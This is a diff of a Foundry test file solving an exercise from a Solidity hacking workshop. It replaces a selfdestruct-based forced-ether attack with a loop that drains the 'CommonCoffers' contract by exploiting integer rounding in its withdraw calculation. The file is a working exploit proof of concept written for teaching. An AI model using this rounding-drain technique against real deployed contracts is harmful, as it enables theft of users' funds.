@@ -7,52 +7,50 @@ import {CommonCoffers} from "../src/SolidityHackingWorkshopV8.sol";
 
 contract Exercise9_CommonCoffers is Test {
     CommonCoffers public commonCoffers;
-    Attacker public attacker;
 
     function setUp() public {
         commonCoffers = new CommonCoffers();
-        attacker = new Attacker();
     }
 
     /**
-     * Attacker can increase the balance of CommonCoffers
-     * contract and make this equation incorrect and in favour of attacker -
-     * uint toRemove = (scalingFactor * _amount) / address(this).balance;
-     * by increasing the balance the scalingfactor will decrease on each withdraw and attacker
-     * can withdraw more than expected tokens
+     * Attacker can withdraw with decreasing his coffers mapping balance
+     * in this equation
+     *  uint toRemove = (scalingFactor * _amount) / address(this).balance;
+     * attacker just have to specify the particular _amount so that
+     * scalingFactor * _amount < contract balance.
      */
     function test_withdraw() public {
         address userA = vm.addr(1);
-        address userB = vm.addr(2);
-        vm.deal(userA, 2 ether);
-        vm.deal(userB, 2 ether);
-        vm.deal(address(this), 10 ether);
 
+        vm.deal(userA, 1 ether);
+
+        vm.deal(address(this), 1 ether);
+        console.log("Balance before attack");
+        console.log(uint256(address(this).balance));
         vm.startPrank(userA);
-        commonCoffers.deposit{value: 2 ether}(userA);
+        commonCoffers.deposit{value: 1 ether}(userA);
         vm.stopPrank();
 
-        vm.startPrank(userB);
-        commonCoffers.deposit{value: 2 ether}(userB);
-        vm.stopPrank();
-        console.log(commonCoffers.scalingFactor());
+        commonCoffers.deposit{value: 1 ether}(address(this));
 
-        commonCoffers.deposit{value: 2 ether}(address(this));
-
-        attacker.attack{value: 8 ether}(address(commonCoffers));
-
-        commonCoffers.withdraw(2000000000000000000);
-
-        commonCoffers.withdraw(2000000000000000000);
+        // now scalingFactor is 200
+        // and balance of contract is 2 ETH
+        // _amount = 0.009 ETH will not change coffers balance and scalingFactor
+        uint scalingFactor = commonCoffers.scalingFactor();
+        uint withdrawAmount = 1000000000000000000;
+        while (withdrawAmount > 0) {
+            withdrawAmount =
+                address(commonCoffers).balance /
+                scalingFactor -
+                10;
+            commonCoffers.withdraw(withdrawAmount);
+        }
+        require(address(this).balance > 1 ether, "invalid balance");
+        console.log("Balance after attack");
+        console.log(uint256(address(this).balance));
     }
 
     fallback() external payable {}
 
     receive() external payable {}
-}
-
-contract Attacker {
-    function attack(address _victim) external payable {
-        selfdestruct(payable(_victim));
-    }
 }
